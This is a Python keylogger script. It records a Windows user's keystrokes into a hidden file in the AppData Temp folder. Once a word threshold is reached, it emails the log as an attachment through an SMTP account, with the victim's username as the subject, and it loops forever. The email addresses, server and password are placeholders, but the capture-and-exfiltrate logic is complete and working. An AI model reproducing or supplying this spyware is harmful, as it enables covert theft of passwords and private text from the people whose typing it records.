# imports
import keyboard
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText
from email.mime.base import MIMEBase 
from email import encoders
import os
import getpass
import time

# variables
txt_path = "C:\\Users\\{}\\AppData\\Local\\Temp\\kbsave.txt".format(getpass.getuser()) # Keylogger log .txt


def main():

    # read the keyboard
    export=""
    recorded = keyboard.record(until='enter')
    recorded = list(str(recorded))
    for i in range(len(recorded)):
        if recorded[i] == "(":
            try:
                if recorded[i+3] == "d":
                    export += ''.join(recorded[i+1])
                elif recorded[i+11] == "d":
                    export = export[:-1]
            except:
                pass
    export+="\n"

    # w/r txt 
    with open(txt_path, 'a') as out:
        out.write(export)
    with open(txt_path, 'r') as out:
        max_size = len(out.read().split())
    print(max_size)

    # send to mail and clean
    if max_size >= [replace]: # nº words(int)
        sendEmail()
        open(txt_path, 'w').close()


def sendEmail():

    
    fromaddr = '[replace]' # from email(str)
    toaddr = '[replace]' # to email(str)
       
    # instance of MIMEMultipart 
    msg = MIMEMultipart() 
      
    # storing the senders email address   
    msg['From'] = fromaddr 
      
    # storing the receivers email address  
    msg['To'] = toaddr 
      
    # storing the subject  
    msg['Subject'] = getpass.getuser()
      
    # string to store the body of the mail 
    body = "Success"
      
    # attach the body with the msg instance 
    msg.attach(MIMEText(body, 'plain')) 
      
    # open the file to be sent  
    filename = "kbsave.txt"
    attachment = open(txt_path, "rb")
      
    # instance of MIMEBase and named as p 
    p = MIMEBase('application', 'octet-stream') 
      
    # To change the payload into encoded form 
    p.set_payload((attachment).read()) 
      
    # encode into base64 
    encoders.encode_base64(p) 
       
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
      
    # attach the instance 'p' to instance 'msg' 
    msg.attach(p) 
      
    # creates SMTP session 
    s = smtplib.SMTP('[replace]', 587) # SMTP server(str)
      
    # start TLS for security 
    s.starttls() 
      
    # Authentication 
    s.login(fromaddr, '[replace]') # pwd smtp acc(str)
      
    # Converts the Multipart msg into a string 
    text = msg.as_string() 
      
    # sending the mail 
    s.sendmail(fromaddr, toaddr, text) 
      
    # terminating the session 
    s.quit() 


if __name__=="__main__":
    while True:
        main()
            
    
